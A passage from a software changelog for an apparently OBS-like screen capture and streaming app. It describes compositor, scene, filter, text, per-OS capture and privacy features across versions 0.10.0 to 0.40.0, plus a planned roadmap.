- **Live-hardware audio smoke tests** (kept `--ignored` on headless CI) plus a release-mode `.frec`
  1080p60 encode guardrail; the full in-app ffmpeg download → verify → record → play-back flow is the
  Phase 4 release smoke test.

## [0.40.0] — 2026-07-02 (Compositor + scenes/sources)

### Added
- **The owned wgpu GPU compositor** (`fcap-compositor`): every visible scene item composes
  back-to-front into the program frame with per-item **move/scale/rotate/crop** (one authoritative,
  unit-tested transform), all seven **blend modes** (normal/additive/subtract/screen/multiply/
  lighten/darken as fixed-function blend states), stride-aware BGRA/RGBA uploads with no CPU
  swizzle, and a headless readback path. Golden tests assert real GPU pixels and skip loudly on
  adapterless machines; the hardware perf gate holds **60 fps at 1080p with 4 sources**
  (5.2 ms/frame measured on an RTX 4070).
- **The owned scene/source/filter model** (`fcap-scene`): scenes hold ordered items (index =
  z-order); sources live in a shared pool and are referenced across scenes; items carry
  transform/blend/visibility/lock and an ordered filter chain. Serde round-trip tested,
  unknown-key tolerant, self-repairing on load — this is the scene-collection project format,
  autosaved (atomic, debounced) to `scene-collection.json` in the OS config dir.
- **The on-GPU video filter chain**, per item and live-parameterized: **Chroma Key** (with spill
  suppression), **Color Correction** (gamma/brightness/contrast/saturation/hue/opacity),
  **LUT** (.cube → 3D lattice), **Blur** (separable gaussian), **Image Mask** (alpha/luma, invert),
  **Sharpen**, **Scroll** (wrapping ticker), and **Crop** — ordered, toggleable, each verified
  against rendered pixels. Filters whose file has not loaded are skipped, never rendered black.
- **New sources**: **Image** (PNG/JPEG/BMP/GIF/WebP…), **Color** (solid block), and **Text** —
  real shaping via rustybuzz (Arabic joining, ligatures, kerning), UAX #9 bidi RTL, word wrap,
  alignment, line spacing, anti-aliased tiny-skia rasterization. The **complete Noto Sans family
  is bundled** (variable fonts: every weight/width, upright + Italic + Arabic + Hebrew; OFL-1.1
  vendored, provenance pinned + hashed) with **per-run script fallback**, so text renders
  identically on every machine; system families stay selectable and a font file overrides.
- **The studio runtime**: capture sessions and static sources reconcile against the active scene
  every tick; newly added items auto-fit on their first frame; the composed program frame feeds
  the same in-process `preview://` pipe at ~30 fps while composing at ~60; per-source
  live/waiting/error status + compose fps flow on the `program` event. A GPU-less machine gets an
  honest "no GPU" report instead of a frozen canvas.
- **The studio UI**: working **Scenes** rail (add/select/rename/reorder/remove), a **Sources**
  rail with visibility/lock/z-order/status per item and an add menu covering every implemented
  kind (plus cross-scene source sharing), **pixel-accurate on-canvas transform handles** (drag,
  corner/edge scale, rotate with 15° snap, Alt-drag cropping), a **Filters** dialog (blend mode +
  the live-editable chain), and per-kind **Properties** dialogs.

### Honest scope notes
- **Media** (video files) is **folded into the recording phase** (decided 2026-07-02): it rides
  the wire-codec / hardware-decode architecture (on-demand ffmpeg) — no pure-Rust general video
  decoder exists, and stubs are against the charter.
- **Browser source** moves to the streaming-depth phase behind an **offscreen-webview design
  spike** (Tauri v2 cannot render a webview to a texture cross-platform).
- **CJK text** uses system fonts for now — Noto CJK (~100 MB) is not bundled; the bundled set
  covers Latin/Greek/Cyrillic + Arabic + Hebrew.

### Security / privacy
- The posture is unchanged: composed program frames stay **in-process** behind the CORS-pinned
  `preview://` scheme; the only file the studio writes is the local scene collection. New
  third-party dependencies (`wgpu` runtime use, `image`, `tiny-skia`, `fontdb`, `unicode-bidi`,
  `pollster`) are permissively licensed and recorded in `THIRD-PARTY-NOTICES.md`.

## [0.25.0] — 2026-07-01 (Capture core)

### Added
- **Per-OS screen & window capture** behind the owned `fcap-capture` interface, yielding timestamped,
  GPU-uploadable frames through a latest-wins channel with an honest dropped-frame count:
  - **Windows** — DXGI Desktop Duplication for displays (with mouse-pointer blending; duplication
    excludes the cursor) and **Windows.Graphics.Capture** for individual windows (Windows 10 1903+),
    surviving display-mode switches and window resizes.
  - **macOS** — **ScreenCaptureKit** (displays + windows, macOS 12.3+); the Screen-Recording
    permission is requested up front, and a denial shows an **Open Screen Recording settings**
    deep-link instead of a silent black frame. (Bundle minimum raised 12.0 → 12.3 —
    ScreenCaptureKit does not exist below 12.3.)
  - **Linux** — the **ScreenCast portal** (`ashpd` → PipeWire) on Wayland, where the *system dialog*
    picks the screen or window (the only capture Wayland allows — the picker says so plainly), plus
    a direct **X11** path (screens + `_NET_CLIENT_LIST` windows) on X sessions.
- **Webcam / capture-card** sources via `nokhwa` (Media Foundation / AVFoundation / V4L2): device
  enumeration, per-device format listing (resolution / fps / wire format), live RGBA frames, and the
  macOS camera-permission flow (`NSCameraUsageDescription` bundled).
- **Live program preview**: the Sources rail's “+” now works — Display Capture, Window Capture, and
  Video Capture Device pickers; the selected source renders live in the program preview with a
  label / resolution / measured-fps / dropped-frames overlay. The pipe is in-process end to end
  (capture → JPEG → the app-private `preview://` scheme → canvas) — frames never touch a socket or
  disk. Direct draw proves the pipe; the wgpu compositor takes over at 0.40.0.
- **Live-hardware smoke tests** (kept `--ignored` on headless CI): display, window, and webcam
  capture verified with real frames on real hardware.

### Security / privacy
- Preview frames stay **in-process** (a custom URI scheme — no localhost socket, no temp files); the
  posture is unchanged: zero outbound network calls, no accounts, no telemetry.
- OS permission denials (macOS Screen Recording / Camera) surface honestly with a settings deep-link.
- New third-party notices: `pipewire` + `x11rb` (Linux capture) and `mozjpeg` (webcam MJPEG decode) +
  `jpeg-encoder` (preview encode) — the latter two carry the **IJG** license, now acknowledged in
  `THIRD-PARTY-NOTICES.md` and allowed in `deny.toml`.

## [0.10.0] — 2026-07-01 (Foundation & repo)

### Added
- **Tauri v2 + React 19 / TypeScript / Vite 7 / Tailwind 4** control UI (Havoc dark) over a Rust Cargo workspace: the `freally-capture` app crate + the owned `fcap-*` engine crates (`capture`, `sources`, `compositor`, `scene`, `audio`, `encode`, `stream`), all `#![forbid(unsafe_code)]`.
- The **studio dock layout** (large program preview, Scenes/Sources rails, Audio Mixer, Controls, Stats) with honest not-yet-implemented states on every control.
- The **typed UI ↔ core bridge**: `health()` (app + linked core-crate versions), `settings_get`/`settings_set`, and a ~2 Hz `stats` push event rendered live in the stats dock (placeholder data, labeled as such until real sampling in 0.70.0).
- The **settings store**: JSON in the OS config dir, atomic temp-file+rename writes, corrupt/missing-file fallbacks; the stats-dock toggle persists across runs.
- **CI matrix** (Windows/macOS/Linux): rustfmt, clippy `-D warnings`, tests, cargo-deny + cargo-audit, UI prettier/eslint/tsc/vitest/build, and per-OS Tauri debug builds; a tag-triggered **release workflow** (per-OS installers → draft GitHub Release).
- The proprietary `LICENSE` + governance docs and the seed `docs/` GitHub Pages site with the true-alpha badge icon.
- **Windows release verified**: GUI app with **no console window** (checked on the built binary); MSI + NSIS installers build.

### Security / privacy
- **Zero outbound network calls** in the app; a strict CSP; the minimal `core:default` capability only; stream keys/secrets are not stored (none exist yet); **no AI/ML anywhere** (charter).

### Planned — 0.25.0 (Capture core)
- Per-OS screen/window capture (Windows DXGI + Windows.Graphics.Capture; macOS ScreenCaptureKit; Linux PipeWire portal + X11) behind a `Capture` interface.
- Webcam / capture-card input via `nokhwa`; a live program preview.

### Planned — 0.40.0 (Compositor + scenes/sources)
- The owned `wgpu` GPU compositor: per-source transform/crop/scale/rotate, blend modes, and the video filter chain (chroma key, color correction, LUT, blur, mask, sharpen, scroll).
- The owned scene/source/filter data model; the full source set (image, text, color, media, browser); the Scenes + Sources rails with on-canvas transform handles.

### Planned — 0.55.0 (Audio mixer + recording)
- The `cpal` audio graph: per-source volume/mute/monitor, up to 6 tracks, sync offset, ducking, push-to-talk, a LUFS meter, and filters (owned classic-DSP denoise — no ML — plus gate, compressor, limiter, EQ, gain).
- Multi-track recording via hardware encoders (NVENC/Quick Sync/AMF/VAAPI/VideoToolbox) + x264 fallback, plus the owned `freally-video` lossless codec; containers mp4/mkv/mov/webm; file splitting; separate-track local copy. The patent-encumbered wire codecs via the on-demand, hash-verified ffmpeg bridge.

### Planned — 0.70.0 (Studio MVP — first public)
- Single-target live streaming (RTMP/RTMPS) to Twitch/YouTube/Kick/Facebook/Trovo/custom, with auto-reconnect and stream delay; the main recording continues regardless of stream state.
- Studio Mode (preview/program) + transitions (cut/fade/slide/swipe/stinger/luma-wipe); the virtual camera (per-OS); global hotkeys; profiles + scene collections; the stats dock. **First public build — completely free, like every Freally app.**

### Planned — 0.85.0 (Multistream / SRT / WHIP + scene/source/encoder depth)
- Simultaneous multistream to several targets, direct to each platform; SRT and WHIP protocols; vertical/multi-canvas output.
- The rolling replay buffer with presets; nested scenes, source groups + per-scene audio; an image-slideshow source + capture-card presets; color/luma-key + render-delay filters; high-FPS/4K output, color-space handling + output downscale; recording-side stream markers; virtual-camera depth (single-source + audio); premium stinger + luma packs; advanced filters.

### Planned — 1.0.0 (Remote API, scripting, game capture & launch)
- The WebSocket remote-control API (Stream Deck / Companion-style) + browser docks; Lua/JS scripting + a plugin SDK.
- Game capture (DX/GL/Vulkan GPU-API hooking, flagged honestly); optional NDI + VST.
- Signed/notarized installers (Win MSI/NSIS, macOS .app/.dmg + the virtual-camera plugin, Linux AppImage/.deb/.rpm/Flatpak) + self-hosted auto-update.
- Accessibility (keyboard-first, screen-reader-labeled, high-contrast) and UI localization into 18 languages (`ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN`, English first, RTL Arabic); onboarding + templates.

[Unreleased]: https://github.com/MikesRuthless12/freally-capture/commits/main
[0.56.0]: https://github.com/MikesRuthless12/freally-capture/releases/tag/v0.56.0
[0.55.0]: https://github.com/MikesRuthless12/freally-capture/releases/tag/v0.55.0
[0.40.0]: https://github.com/MikesRuthless12/freally-capture/releases/tag/v0.40.0
[0.25.0]: https://github.com/MikesRuthless12/freally-capture/releases/tag/v0.25.0
[0.10.0]: https://github.com/MikesRuthless12/freally-capture/releases/tag/v0.10.0
